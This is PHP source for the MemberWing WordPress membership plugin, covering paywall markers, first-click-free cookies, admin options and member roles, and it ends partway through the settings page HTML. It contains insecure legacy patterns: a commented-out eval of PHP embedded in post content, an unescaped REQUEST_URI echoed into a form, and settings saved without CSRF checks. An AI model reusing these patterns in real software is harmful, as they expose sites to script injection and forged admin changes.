<?php

/* **************************************************************************
This software is provided "as is" without any express or implied warranties,
including, but not limited to, the implied warranties of merchantibility and
fitness for any purpose.
In no event shall the copyright owner, website owner or contributors be liable
for any direct, indirect, incidental, special, exemplary, or consequential
damages (including, but not limited to, procurement of substitute goods or services;
loss of use, data, rankings with any search engines, any penalties for usage of
this software or loss of profits; or business interruption) however caused and
on any theory of liability, whether in contract, strict liability, or
tort(including negligence or otherwise) arising in any way out of the use of
this software, even if advised of the possibility of such damage.
To request source code for MemberWing please contact http://www.memberwing.com/contact
************************************************************************** */



require_once (dirname(__FILE__) . '/mw-config.php');
require_once (dirname(__FILE__) . '/utils.php');
if (@file_exists (dirname(__FILE__) . '/tracefusion.php'))
   require_once (dirname(__FILE__) . '/tracefusion.php');

// Setting it to true will force *all* free articles to become premium after 7 days since their publication.
// Such articles will be visible only to Gold and Platinum users.
$g_auto_premialization_of_articles        = false;

// Set it to 0 to follow strict Google guidelines re: First Click Free functionality
// Set it to 1 to allow first click free also from non-search engine sites, such as facebook.com, twitter.com and others. Done for MeetInnovators.
// Set it to 2 to allow temporary debug mode for MeetInnovators's enhancements.
define("MEETINNOVATORS", 0);

    // Prevent loading file directly
    if (basename($_SERVER['PHP_SELF']) == basename(__FILE__))
        {
        $var =<<<VAR___VAR
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="description" content="Free Membership Site Resources, Help and Tutorials" />
<meta name="keywords" content="membership site" />

<title>Membership Site</title>
</head>

<body>
<h1 align="center"><a href="http://www.memberwing.com/">Membership Site</a>: Information and Resources</h1>
<h2 align="center"><a href="http://www.memberwing.com/download/wordpress-membership-site-plugin-memberwing/">Build Membership site with Free Wordpress Plugin - MemberWing</a></h2>
<h2 align="center">Membership Site Help, Tutorials and Resources are available at <a href="http://forum.memberwing.com/">membership site discussion forum</a></h2>
<p align="center">&nbsp; </p>
</body>
</html>
VAR___VAR;
        exit ($var);
        }




//------------------------------------------


// Set license properties
if (!function_exists ('license_valid'))
   {
   function license_valid(){return 1;}
   }
$_license_properties = array();
$_license_properties['edition']='free';

if ($_license_properties['edition'] == 'free' || $_license_properties['edition'] == 'w1' || !license_valid())
   $_show_branding=TRUE;
else
   $_show_branding=FALSE;
//------------------------------------------

if (!class_exists("MemberWing"))
   {
   class MemberWing
      {
      var $adminOptionsName = "MemberWingAdminOptions";
      var $adminOptions = NULL;
      var $current_fcf_cookie = "";    // Array

      //---------------------------------------------------------------------
      function MemberWing ()
         { //constructor
         $this->adminOptions = $this->getAdminOptions ();
         }
      //---------------------------------------------------------------------

      //---------------------------------------------------------------------
      function visit_is_search_engine_spider()
         {
         return preg_match ('#(slurp|bot|sp[iy]der|scrub(by|the)|crawl(er|ing|@)|yandex)#i', $_SERVER['HTTP_USER_AGENT']);
         }
      //---------------------------------------------------------------------

      //---------------------------------------------------------------------
      function visit_from_search_engine()
         {
         return preg_match ('#^http://[a-z]+\.(google|aol|live|msn|baidu|yandex|search|ask)\.#i', $_SERVER['HTTP_REFERER']);
         }
      //---------------------------------------------------------------------

      //---------------------------------------------------------------------
      // Returns TRUE if referrer is this blog or empty.
      function visit_is_from_us()
         {
         // Extract domains without 'www.' part
         if (!isset($_SERVER['HTTP_REFERER']))
            return 1;
         $our_domain      = strtolower (preg_replace ('@(^https?://)?(www\.)?([^/]+).*$@i', "$3", $_SERVER['HTTP_HOST']));
         $referrer_domain = strtolower (preg_replace ('@(^https?://)?(www\.)?([^/]+).*$@i', "$3", $_SERVER['HTTP_REFERER']));

         if ($our_domain == $referrer_domain)
            return TRUE;
         else
            return FALSE;
         }
      //---------------------------------------------------------------------

      //---------------------------------------------------------------------
      function current_page_hash()
         {
         if (mwdebug())
            return trim ($_SERVER['REQUEST_URI'], '/');        // Plain cookie for debugging.
         else
            return substr(md5(trim ($_SERVER['REQUEST_URI'], '/')), -16);
         }
      //---------------------------------------------------------------------

      //---------------------------------------------------------------------
      function current_page_is_first_click_free ()
         {
         if ($this->adminOptions['first_click_free'] == 'yes')
            {
            if ($this->visit_is_search_engine_spider())
               return TRUE;

            if ($this->current_fcf_cookie)
               $raw_cookies_array = $this->current_fcf_cookie;
            else
               $raw_cookies_array = isset($_COOKIE['memberwing-fcf'])?$_COOKIE['memberwing-fcf']:"";

            $free_page_hash_array = preg_replace ('#:..(\||$)#', "|", $raw_cookies_array);
            $free_page_hash_array = preg_replace ('#(^|\|)..:#', "|",   $free_page_hash_array);
            $free_page_hash_array = explode ('|', $free_page_hash_array);

            if (in_array ($this->current_page_hash(), $free_page_hash_array))
               return TRUE;
            }

         return FALSE;
         }
      //---------------------------------------------------------------------

      //---------------------------------------------------------------------
      //
      // Current issue: new page, regardless if it is premium or free - sets cookie. Better would be to set cookie only for premium page visits.
      // but at this point i don't know if given page is free or premium

      function set_cookie ()
         {
         if ($this->adminOptions['first_click_free'] == 'yes')
            {
            if ($this->visit_is_search_engine_spider())
               return;  // For spiders we don't set cookies.

            $normalized_request_uri = trim ($_SERVER['REQUEST_URI'], '/');    // With '/' stripped.

            if (preg_match ('|\..{2,4}$|', $normalized_request_uri))
               return;  // For non-essential pages we don't set cookies.

            // Visiting valid page here. We still don't know here though whether it is "premium" or "free" page.

            $visit_from_search_engine = $this->visit_from_search_engine();

            $raw_cookies_array = isset($_COOKIE['memberwing-fcf'])?$_COOKIE['memberwing-fcf']:"";
            $this->current_fcf_cookie = $raw_cookies_array;

            $new_cookie = ($visit_from_search_engine?"se:":"nn:") . $this->current_page_hash() . ':xx';  // 'REQUEST_URI' includes query string - required for non-seo-optimized permalinks.

            // Overwrite cookie only if  current visit is *not* from this blog, AND:
            //    -  cookie is empty   OR
            //    -  current visit is from search engine   OR
            //    -  it was recorded from previous visit from search engine
            if ($visit_from_search_engine)
               {
               // Force-insert new cookie into flat array.
               $new_cookies_array = $this->add_cookie_to_raw_array ($raw_cookies_array, $new_cookie, true);
               }
            else if (MEETINNOVATORS)   // Case for non-search engine referrers, including ourselves.
               {
               // Insert new cookie into array if it has empty or "se:"-type of slots available.
               $new_cookies_array = $this->add_cookie_to_raw_array ($raw_cookies_array, $new_cookie, false);
               }
            else
               $new_cookies_array = "";

            if ($new_cookies_array && $new_cookies_array!=$raw_cookies_array)
               {
               // If changes to cookie was made
               setcookie("memberwing-fcf", $new_cookies_array, strtotime("+5 years"), SITECOOKIEPATH);
               $this->current_fcf_cookie = $new_cookies_array;
               }

            }
         }
      //---------------------------------------------------------------------

      //---------------------------------------------------------------------
      //
      // $raw_cookies_array = 'nn:5298573295:xx|nn:7421545135:xx|se:091234124:xx'
      // $new_cookie        = 'se:7865634343:xx'
      // $force_add:
      //    FALSE - add cookie to array only if there are empty spots or "se:" types of cookies slots to replace
      //    TRUE  - search for empty or "se:" types of slots first, if not found - replace oldest cookie with this one.
      //
      function add_cookie_to_raw_array ($raw_cookies_array, $new_cookie, $force_add)
         {
         $required_arr_size = $this->adminOptions['first_click_free_pages'];
         $cookies_array = explode ('|', $raw_cookies_array);

         // Already in array? Remove it. It then will be added to the end of array (refreshed).
         if (in_array ($new_cookie, $cookies_array))
            {
            unset ($cookies_array[array_search($new_cookie, $cookies_array)]);
            }

         // Make sure cookies array matches admin option's pages number.
         if ($required_arr_size > count($cookies_array))
            {
            // Pad array with empty slots
            $cookies_array = array_pad ($cookies_array, $required_arr_size, "");
            }
         else if ($required_arr_size < count($cookies_array))
            {
            // Remove oldest cookies
            $num = count($cookies_array) - $required_arr_size;
            for ($i=0; $i<$num; $i++)
               array_shift ($cookies_array);
            }

         // Add cookie to array now
         // Try empty slots first.
         $slot_found = false;
         if (in_array ("", $cookies_array))
            {
            $cookies_array[array_search("", $cookies_array)] = $new_cookie;
            $slot_found = true;
            }
/*
PHP 5.x only. For MEETINNOVATORS
         else
            {
            // Try "se:" cookies second
            foreach ($cookies_array as &$cookie)
               {
               if (!strncmp ("se:", $cookie, 3))
                  {
                  $cookie = $new_cookie;
                  $slot_found = true;
                  break;
                  }
               }
            }
*/
         if (!$slot_found && $force_add)
            {
            // Forcefully add new cookie to the end of array, losing the oldest cookie out.
            array_push ($cookies_array, $new_cookie);
            array_shift ($cookies_array);
            }

         $new_raw_cookie_array = implode ('|', $cookies_array);

         return ($new_raw_cookie_array);
         }
      //---------------------------------------------------------------------

      //=====================================================================
      // '$full_content' == TRUE => inside of the_content filter. FALSE=> inside of excerpt and similar cut-downs content filters.
      function protectContent ($content = '', $_show_branding, $full_content)
         {
         global $_branding_html;

         /// This line will allow to find and eval PHP inside content.
         /// PHP is inserted inside page's content as: {{{?php ....some php code.... ?}}}
         ///$content = preg_replace_callback ('|\{\{\{\?php([^\}]*)\?\}\}\}|i', create_function ('$matches', 'ob_start(); eval ($matches[1]); $RES=ob_get_contents(); ob_end_clean(); return $RES;'), $content);

         /// This line will allow to use any tags within content by using '{{{' instead of '<', such as:
         /// {{{script ... }}} ... {{{/script}}}
         /// $content = preg_replace ('|\{\{\{([^}]*)\}\}\}|', "<$1>", $content);

         /// This line allows to dynamically insert values of $_SERVER[...] variables inside content:
         /// <b>__SERVER__REMOTE_ADDR__</b>  - will be replaced with <b>123.45.6.78</b> by quering server variable $_SERVER['REMOTE_ADDR'].
         /// Syntax:
         /// __SERVER__nnnnn__ will pull $_SERVER['nnnn'] and insert it into the spot.
         ///
         ///$content = preg_replace_callback ('|__SERVER__([a-zA-Z_])*?__|', create_function ('$matches', 'if (isset($_SERVER[$matches[1]])) return $_SERVER[$matches[1]]; else return 1;'), $content);

         // Replace all occurences of __SERVER__REMOTE_ADDR__ with value of $_SERVER['REMOTE_ADDR']
         //
         $content = str_replace ('__SERVER__REMOTE_ADDR__', $_SERVER['REMOTE_ADDR'], $content);

         // <p>{+++}</p> -> {+++} - helps to avoid breaking tags.
         $content = preg_replace ('|(<p>)?(\{[+]{1,4}\})(</p>)?|', "$2", $content);

/* iDevAffiliate support code

!!!
Add Advanced Variable for Paypal:

notify_url=http://maxawareness.com/members/wp-content/plugins/member-wing/notify_paypal.php
custom=__SERVER__REMOTE_ADDR__

*/

         //... Inefficient to call it every time. Check if not needed.
         $devOptions = $this->getAdminOptions();

         // markers+capabilities
         $markers_caps = array (
            array($this->adminOptions['bronze_content_marker'],   'read_bronze'),
            array($this->adminOptions['silver_content_marker'],   'read_silver'),
            array($this->adminOptions['gold_content_marker'],     'read_gold'),
            array($this->adminOptions['platinum_content_marker'], 'read_platinum')
            );

         if ($this->current_page_is_first_click_free() || $_SERVER['REMOTE_ADDR'] == $this->adminOptions['allow_ip_address'])
            {
            foreach ($markers_caps as $marker_cap)
               $content = str_replace ($marker_cap[0], "", $content);

            if ($full_content)
               {
               if ($this->adminOptions['tracefusion_text_protection_active'])
                  // Do TraceFusion digital signature only for full content articles. Not for excerpts or RSS feeds.
                  $content .= $this->GetTraceFusionHTMLSignature ();
               }
            else
               {
               // Eliminate tracefusion signature from excerpts.
               $content = preg_replace ('#\[\[T_F\]\][^<]+#s', '', $content);
               }
            return ($content);
            }

         $cutoff_ptr = FALSE;
         foreach ($markers_caps as $marker_cap)
            {
            $marker_pos = strpos ($content, $marker_cap[0]);
            if ($marker_pos!==FALSE)
               {
               if (current_user_can ($marker_cap[1]) || current_user_can ('edit_users'))
                  $content = str_replace ($marker_cap[0], "", $content);  // Melt marker for authorized user.
               else
                  {
                  if ($cutoff_ptr===FALSE || $marker_pos < $cutoff_ptr)
                     $cutoff_ptr = $marker_pos; // For unprivileged user cut off as much article as possible.
                  }
               }
            }

         // --------------------------------
         // 7 days auto-premialization of articles feature.
         //
         if ($g_auto_premialization_of_articles)
            {
            // Set input parameters:
            $excerpt_length_in_chars      = 250;   // Set length of excerpt in characters. Break will occur at the next "space" after that.
            $free_post_lifetime_in_days   = 7;     // After this number of days each "free" post will become premium one.

            global $wp_query;
            if ($wp_query->post->post_type=='post')
               {
               $post_age_in_days = floor((strtotime("now") - strtotime($wp_query->post->post_date_gmt . " GMT")) / (60*60*24));
               if ($cutoff_ptr === FALSE && !current_user_can ('edit_users') && !current_user_can ('read_gold') && !current_user_can ('read_platinum') && $post_age_in_days >= $free_post_lifetime_in_days)
                  {
                  // Recalculate $cutoff_ptr here.
                  // Logic: find first space after 250'th character. Count only chars outside of HTML tags.
                  $content_length = strlen ($content);
                  for ($i=0, $j=0, $counter_stopped=false; $i<$content_length && ($j<$excerpt_length_in_chars || !($counter_stopped==false && $content[$i]==' ')); $i++)
                     {
                     if ($content[$i] == '<')
                        $counter_stopped = true;   // Entering tag. Stop counter.
                     if (!$counter_stopped)
                        $j++;
                     if ($content[$i] == '>')
                        $counter_stopped = false;  // Leaving tag. Restart counter.
                     }

                  if ($i == $content_length)
                     {
                     // article too short to satisfy exceprt length requirements.
                     // Leaving '$cutoff_ptr' untouiched.
                     }
                  else
                     $cutoff_ptr = $i;
                  }
               }
            }
         // --------------------------------

         // --------------------------------
         // Customize "login" so that it'd return logged on user back to current page.
         $warn_msg = $this->adminOptions['premium_content_warning'];
         $current_page = ltrim ($_SERVER['REQUEST_URI'], '/');
         $warn_msg = preg_replace ('|(redirect_to=)/\"|', "$1/$current_page\"", $warn_msg);
         $warn_msg_notags_pattern = preg_quote ($this->adminOptions['premium_content_warning_notags']);
         // --------------------------------

         if ($cutoff_ptr!==FALSE)
            {
            //OLD Version - prone to producing invalid HTML due to killed HTML tags from premium marker to the end of article.
            //             $content  = substr ($content, 0, $cutoff_ptr);   // Return text before premium marker
            // Update - preserves TAGS bones, but strips the meat and sucks the blood out of them.
            $content1 = substr ($content, 0, $cutoff_ptr);
            // Melt everything outside of tags, leaving all tags in tact. Tags == <...>
            $content2 = preg_replace ('#(?<=^|\>)[^\<]*#', '', substr ($content, $cutoff_ptr));
            // Melt all inner attributes of tags
///!!!            $content2 = preg_replace ('/<([a-zA-Z0-9]+)\s[^>]*>/', "<$1>", $content2);
///!!!            // Melt <img> tags - they'll leave broken icons
///!!!            // 'str_ireplace()' is PHP 5.x function, so have to use this one twice.
///!!!            $content2 = str_replace ('<img>', '', $content2);
///!!!            $content2 = str_replace ('<IMG>', '', $content2);
///////////!!!
            // Replace all inner attributes of all tags onto display:none; style.
/***
For some reason the line of code below won't accept single line comment. I want to keep it for now.
            $content2 = preg_replace ('|<([a-zA-Z0-9]+)[^>]*?(/)?>|', "<$1 style=\"display:none;\" $2>", $content2);
***/
///////////!!!

///!!!            $content = $content1 . $content2;
///////////!!!
            // Wrap all messy, potentially visually unappealing, squished tags into invisibility.
            $content = $content1 . '<div style="display:none;">' . $content2 . '</div>';
///////////!!!

            $content .= $warn_msg;
            if ($_show_branding)
               {
               $content .= $_branding_html;
               }
            }
         else
            {
            // Replace plaintext premium content warning onto HTML rich one.
            // Some wordpress/themes excerpt logic:
            // -  calls the_content to pull full content
            // -  strip it from all tags
            // -  gets first 100 or so characters to create 'excerpt'
            // -  as a result - we have plaintext ugly 'premium content warning'. So to fix it - we search for "plaintext" version of our premium content warning and
            //    either melt it or replace it onto HTML rich version of it.
            if (strlen($this->adminOptions['premium_content_warning_notags'])>20)
               $content = preg_replace ("#$warn_msg_notags_pattern#", $warn_msg, $content);
            }

         // [[T_F]] must be followed with '<'. If not - eliminate it.
         $content = preg_replace ('#\[\[T_F\]\][^<].*?(\[\[T_F\]\]|$)#', '', $content);

         if ($this->adminOptions['tracefusion_text_protection_active'])
            {
            // Add tracefusion signature for large enough articles that are not already signed.
            if (!is_feed() && $full_content && (strpos($content, '[[T_F]]')===FALSE) && strlen(preg_replace ('|<[^>]+?>|', '', $content))>300)
               {
               // Do TraceFusion digital signature only for full content articles. Not for excerpts or RSS feeds.
               $content .= $this->GetTraceFusionHTMLSignature ();
               }
            }

         return $content;  // No markers found - return full contents.
         }
      //=====================================================================

   //========================================================================
   // Function returns TraceFusion HTML signature ready to be appended in HTML
   function GetTraceFusionHTMLSignature ()
      {
      $tracefusion_signature = "";


      return $tracefusion_signature;
      }
   //========================================================================

   function protectContent_cont     ($content)
      {
      global $_show_branding;
      return ($this->protectContent ($content, $_show_branding, TRUE));
      }
   function protectContent_limit    ($content)
      {
      global $_show_branding;
      return ($this->protectContent ($content, $_show_branding, FALSE));
      }
   function protectContent_exc      ($content)
      {
      return ($this->protectContent ($content, FALSE, FALSE));
      }
   function protectContent_rss      ($content)
      {
      return ($this->protectContent ($content, FALSE, FALSE));
      }
   function protectContent_excrss   ($content)
      {
      return ($this->protectContent ($content, FALSE, FALSE));
      }


      //---------------------------------------------------------------------
      //Returns an array of admin options
      function getAdminOptions()
          {
          //
          // Note: 'premium_content_warning' will be stored in encoded format to avoid HTML chars issues.

          $blog_root = UTILS_GetBaseDirAddressPair(TRUE);
          // Get site root addresses
          $blog_root_physical = $blog_root[0];

          $default_welcome_email =
              "Dear {FIRST_NAME} {LAST_NAME}, You are confirmed for '{ITEM_NAME}'." .
              "<br />Your username / password are: {USERNAME} / {PASSWORD}" .
              "<br />Click here to Login: {BLOG_LOGIN_URL}" .
              "<br /><br />Please contact us for any questions! Sincerely,<br/>{BLOG_ROOT_URL}";

          $default_premium_content_warning =
                   '<p style="background-color:#FFC;padding:3px;border:2px solid #FFCCCC;margin:0 0 5px;">' .
                   'The rest of this article is available to premium members only.<br /><a href="' .
                   rtrim(get_bloginfo ('wpurl'), '/') .
                   '/wp-login.php?redirect_to=/">Login</a> or <a href="/join/"><b>Become a member</b></a></p>';

          // Set defaults.
          $mgDefaultOptions = array (
           'bronze_content_marker' =>   '{+}',
           'silver_content_marker' =>   '{++}',
           'gold_content_marker' =>     '{+++}',
           'platinum_content_marker' => '{++++}',
           'paypal_sandbox_enabled' => '0',
           'clickbank_secret_key' => '',
           'sage_part_numbers' => '',
           'allow_ip_address' => '0.0.0.0',
           'memberwing_license_key' => strtoupper(md5(strrev($_SERVER['HTTP_HOST']))),
           'hide_comments_from_non_logged_on_users' => '1',
           'delete_user_account_when_cancel' => '0',
           'idevaffiliate_integration_enabled' => '0',
           'idevaffiliate_install_dirname' => rtrim(get_bloginfo ('wpurl'), '/') . '/idevaffiliate',
           'aweber_integration_enabled' => '0',
           'aweber_list_email' => 'YOUR-LISTNAME@aweber.com',
           'protected_files_physical_addr' => $blog_root_physical . '/PREMIUM_FILES',   /* off blog's root */
           'protected_files_logical_addr' => 'premium',            /* off blog's root */
           'tracefusion_bin_protection_active'   => '1',
           'tracefusion_text_protection_active'  => '1',
           'first_click_free' => 'no',
           'first_click_free_pages' => '1',
           'premium_content_warning' =>  base64_encode ($default_premium_content_warning),
           'welcome_email_subject' => 'Welcome to our site',
           'welcome_email_body' => base64_encode ($default_welcome_email),
           );

          $devOptions = get_option ($this->adminOptionsName);
          if (!empty($devOptions))
             {
             foreach ($devOptions as $key => $option)
                $mgDefaultOptions[$key] = $option;
             }

          $pcw = base64_decode ($mgDefaultOptions ['premium_content_warning']);
          $mgDefaultOptions ['premium_content_warning_notags'] = preg_replace ('|<[^>]+>|', '', $pcw);  // Melt tags.

          update_option($this->adminOptionsName, $mgDefaultOptions);

          $mgDefaultOptions ['premium_content_warning'] = $pcw;
          $mgDefaultOptions ['welcome_email_body'] = base64_decode ($mgDefaultOptions ['welcome_email_body']);

          return $mgDefaultOptions;
          }
      //---------------------------------------------------------------------

      //---------------------------------------------------------------------
      function init()
         {
         $this->getAdminOptions();
         $member_roles_caps =
         array (
            array (
               'bronze_member',   // Role name
               'Bronze Member',   // Role's display name
               array (            // Role's capabilities
                  'read',
                  'read_bronze',
                  'level_0',
                  )
               ),
            array (
               'silver_member',   // Role name
               'Silver Member',   // Role's display name
               array (            // Role's capabilities
                  'read',
                  'read_bronze',
                  'read_silver',
                  'level_0',
                  )
               ),
            array (
               'gold_member',     // Role name
               'Gold Member',     // Role's display name
               array (            // Role's capabilities
                  'read',
                  'read_bronze',
                  'read_silver',
                  'read_gold',
                  'level_0',
                  )
               ),
            array (
               'platinum_member', // Role name
               'Platinum Member', // Role's display name
               array (            // Role's capabilities
                  'read',
                  'read_bronze',
                  'read_silver',
                  'read_gold',
                  'read_platinum',
                  'level_0',
                  )
               )
            );

         for ($i=0; $i<count($member_roles_caps); $i++)
            {
            $role = get_role ($member_roles_caps[$i][0]);
            if (mwdebug())
                {
                if ($role)
                   log_event (__FILE__, __LINE__, "NOTE: role exists: {$member_roles_caps[$i][0]}");
                else
                   log_event (__FILE__, __LINE__, "NOTE: role does not exist: {$member_roles_caps[$i][0]}");
                }
            if (!$role)
                {
                $role = add_role ($member_roles_caps[$i][0], $member_roles_caps[$i][1]);
                if (mwdebug() && !$role) log_event (__FILE__, __LINE__, "WARNING: add_role({$member_roles_caps[$i][0]}) returned false");
                }
            if ($role)
               {
               for ($k=0; $k<count($member_roles_caps[$i][2]); $k++)
                  {
                  if (!$role->has_cap ($member_roles_caps[$i][2][$k]))
                     $role->add_cap ($member_roles_caps[$i][2][$k]);
                  }
               }
            }

         // Create database tables.
         //
         create_products_table ();
         populate_products_table ();
         create_customers_table ();
      }
      //---------------------------------------------------------------------

      //---------------------------------------------------------------------
      //Prints out the admin page
      function printAdminPage()
         {
         $devOptions = $this->getAdminOptions();
         if (isset($_POST['update_memberWingPluginSettings']))
            {
            if (isset($_POST['memberWingAllowIpAddress']))
               $devOptions['allow_ip_address'] = apply_filters('content_save_pre', trim($_POST['memberWingAllowIpAddress']));
            if (isset($_POST['memberWingMemberWingLicenseKey']))
               $devOptions['memberwing_license_key'] = $_POST['memberWingMemberWingLicenseKey'];

            if (isset($_POST['memberWingHideCommentsFromNonLoggedOnUsers']))
               $devOptions['hide_comments_from_non_logged_on_users'] = $_POST['memberWingHideCommentsFromNonLoggedOnUsers'];
            else
               $devOptions['hide_comments_from_non_logged_on_users'] = '0';

            if (isset($_POST['memberWingDeleteUserAccount']))
               $devOptions['delete_user_account_when_cancel'] = $_POST['memberWingDeleteUserAccount'];
            else
               $devOptions['delete_user_account_when_cancel'] = '0';

            if (isset($_POST['memberWingIDevAffiliateEnabled']))
               $devOptions['idevaffiliate_integration_enabled'] = $_POST['memberWingIDevAffiliateEnabled'];
            else
               $devOptions['idevaffiliate_integration_enabled'] = '0';
            if (isset($_POST['memberWingiDevAffiliateInstallDir']))
               $devOptions['idevaffiliate_install_dirname'] = trim($_POST['memberWingiDevAffiliateInstallDir'], '/\\');

            if (isset($_POST['memberWingAWeberEnabled']))
               $devOptions['aweber_integration_enabled'] = $_POST['memberWingAWeberEnabled'];
            else
               $devOptions['aweber_integration_enabled'] = '0';
            if (isset($_POST['memberWingAweberListEmail']))
               $devOptions['aweber_list_email'] = trim ($_POST['memberWingAweberListEmail']);
            else
               $devOptions['aweber_list_email'] = '';

            if (isset($_POST['memberWingProtectedFilesPhysicalAddr']))
               $devOptions['protected_files_physical_addr'] = apply_filters('content_save_pre', rtrim($_POST['memberWingProtectedFilesPhysicalAddr'], '/ '));
            if (file_exists(dirname(__FILE__) . '/dcp.php'))   // Some editions might exclude DCP
               {
               include_once (dirname(__FILE__) . '/dcp.php');
               DCP_WriteHtaccessFile (rtrim($_POST['memberWingProtectedFilesPhysicalAddr'], '/ '), TRUE, FALSE);  // Create destination dir, but do not overwrite .htaccess if already exists.
               }
            if (isset($_POST['memberWingProtectedFilesLogicalAddr']))
               $devOptions['protected_files_logical_addr'] = apply_filters('content_save_pre', trim($_POST['memberWingProtectedFilesLogicalAddr'], '/ '));

            if (isset($_POST['memberWingTraceFusionBinProtectionActive']))
               $devOptions['tracefusion_bin_protection_active'] = $_POST['memberWingTraceFusionBinProtectionActive'];
            else
               $devOptions['tracefusion_bin_protection_active'] = '0';
            if (isset($_POST['memberWingTraceFusionTextProtectionActive']))
               $devOptions['tracefusion_text_protection_active'] = $_POST['memberWingTraceFusionTextProtectionActive'];
            else
               $devOptions['tracefusion_text_protection_active'] = '0';

            if (isset($_POST['memberWingPaypalSandboxEnabled']))
               $devOptions['paypal_sandbox_enabled'] = $_POST['memberWingPaypalSandboxEnabled'];
            else
               $devOptions['paypal_sandbox_enabled'] = '0';

            if (isset($_POST['memberWingClickbankSecretKey']))
               $devOptions['clickbank_secret_key'] = apply_filters('content_save_pre', $_POST['memberWingClickbankSecretKey']);
            if (isset($_POST['memberWingFirstClickFreeYesNo']))
               $devOptions['first_click_free'] = apply_filters('content_save_pre', $_POST['memberWingFirstClickFreeYesNo']);

            if (isset($_POST['memberWingSagePartNumbers']))
               $devOptions['sage_part_numbers'] = apply_filters('content_save_pre', $_POST['memberWingSagePartNumbers']);

            if (isset($_POST['memberWingFirstClickFreePages']))
               {
               $devOptions['first_click_free_pages'] = apply_filters('content_save_pre', $_POST['memberWingFirstClickFreePages']);
               if ($devOptions['first_click_free_pages'] < 1)   $devOptions['first_click_free_pages'] = 1;
               if ($devOptions['first_click_free_pages'] > 10)  $devOptions['first_click_free_pages'] = 10;
               }
            if (isset($_POST['memberWingPremiumContentWarning']))
               {
               $pcw = apply_filters('content_save_pre', $_POST['memberWingPremiumContentWarning']);
               $pcw = preg_replace ('/\\\\/', "", $pcw);
               $devOptions['premium_content_warning'] =  base64_encode ($pcw);
               $devOptions['premium_content_warning_notags'] = preg_replace ('|<[^>]+>|', '', $pcw);  // Melt tags.
               }
            if (isset($_POST['memberWingWelcomeEmailSubject']))
               $devOptions['welcome_email_subject'] = apply_filters('content_save_pre', $_POST['memberWingWelcomeEmailSubject']);
            if (isset($_POST['memberWingWelcomeEmailBody']))
               {
               $email_body = apply_filters('content_save_pre', $_POST['memberWingWelcomeEmailBody']);
               $email_body = preg_replace ('/\\\\/', "", $email_body);
               $devOptions['welcome_email_body'] = base64_encode ($email_body);
               }

            update_option($this->adminOptionsName, $devOptions);

            $devOptions['premium_content_warning'] =  base64_decode ($devOptions ['premium_content_warning']);
            $devOptions['welcome_email_body']      =  base64_decode ($devOptions ['welcome_email_body']);

            $this->adminOptions = $devOptions; // Reinitialize member var with fresh options.
            ?>
<div class="updated"><p><strong><?php _e("Settings Updated.", "MemberWingPlugin");?></strong></p></div>
                    <?php
                } ?>
<div class=wrap>
    <form method="post" action="<?php echo $_SERVER["REQUEST_URI"]; ?>">
<?php
        $mw_logo_url = UTILS_GetBaseDirAddressPair(FALSE);
        $mw_logo_url = $mw_logo_url[1] . '/MemberWing_4_Avatar_Gold.png';
?>
        <div align="center">
         <p>&nbsp;</p>
         <img src="<?php echo $mw_logo_url; ?>">
        </div>

<?php
      global $_license_properties;
      $blog_root = UTILS_GetBaseDirAddressPair(TRUE);
      // Get site root addresses
      $blog_root_physical = $blog_root[0];
      $blog_root_logical  = $blog_root[1];
      $phys_addr_len = strlen($devOptions['protected_files_physical_addr']);
      $log_addr_len = strlen($devOptions['protected_files_logical_addr']);
      if ($_license_properties['edition']=='free' || !file_exists(dirname(__FILE__) . '/dcp.php'))
         {
         $input_option = ' disabled="disabled" ';
         $memberwing_license_key = "";    // Do not show license key to free users.
         }
      else
         {
         $input_option = '';
         $memberwing_license_key = $devOptions['memberwing_license_key'];
         }
      $tracefusion_key        = $memberwing_license_key;
?>

      <div class="submit" align="center">
          <input type="submit" name="update_memberWingPluginSettings" value="<?php _e('Update Settings', 'MemberWingPlugin') ?>" />
      </div>

<?php    if ($_license_properties['edition']=='free') { ?>
      <div align="center" style="margin:5px;padding:5px;border:2px solid red;color:#A00;background:#FF0;">
      <b>NOTE: Some features are only available in <a href="http://www.memberwing.com/#BuyMemberWingNow">Professional editions of MemberWing</a></b>
      </div>
<?php } ?>
        <!-- License info -->
        <div align="center" style="border:1px solid gray;padding:8px;margin:6px 0px;">
         <table style="width:800px;background-color:#555;">
           <tr style="background-color:#FFE;">
             <td colspan="2" align="center"><div style="padding:3px;"><h3 style="margin:1px;padding:1px;">MemberWing License Information</h3>Please keep your MemberWing license key private and confidential</div></td>
           </tr>
           <tr style="background-color:#DFD;">
             <td width="30%"><div style="padding:3px;">MemberWing version:</div></td>
             <td width="70%"><div style="padding:3px;">&nbsp;&nbsp;&nbsp;<input type="text" name="memberwing_version" value="<?php echo MEMBERWING_VERSION . ' [' . GetMemberWingEditionString() . ']'; ?>" size="50" readonly="readonly" /></div></td>
           </tr>
           <tr style="background-color:#DFD;">
             <td width="30%"><div style="padding:3px;">Domain name:</div></td>
             <td width="70%"><div style="padding:3px;">&nbsp;&nbsp;&nbsp;<input type="text" name="domain_name" value="<?php echo $_SERVER['HTTP_HOST']; ?>" size="50" readonly="readonly" /></div></td>
           </tr>
           <tr style="background-color:#DFD;">
             <td><div style="padding:3px;">MemberWing License Key:</div></td>
             <td><div style="padding:3px;">&nbsp;&nbsp;&nbsp;<input type="text" name="memberWingMemberWingLicenseKey" value="<?php echo $memberwing_license_key; ?>" size="50" <?php echo $input_option; ?> /></div></td>
           </tr>
           <tr style="background-color:#DFD;">
             <td><div style="padding:3px;">TraceFusion Key:</div></td>
             <td><div style="padding:3px;">&nbsp;&nbsp;&nbsp;<input type="text" name="memberWingTraceFusionKey" value="<?php echo $tracefusion_key; ?>" size="50" readonly="readonly" /></div></td>
           </tr>
         </table>
        </div>

        <!-- Digital content Download protection -->
        <div style="border:1px solid gray;padding:8px;margin:6px 0px;">
         <table style="background-color:#555;">
           <tr style="background-color:#FFE;">
             <td colspan="2" align="center"><div style="padding:3px;"><h3 style="margin:1px;padding:1px;">Digital content protection. Enhanced with PromoFusion</h3>This feature protects your premium digital materials (video, audio, images, files, ebooks, downloadables, static pages, etc...) from content theft.<br />
             Digital content protection prevents unauthorized users from accessing, viewing and downloading of premium files by using direct links and URLs.<br />
             Additionally to that <b>PromoFusion</b> logic allows you to substitute protected premium content with the promotional materials of the same type at the time of request.<br />
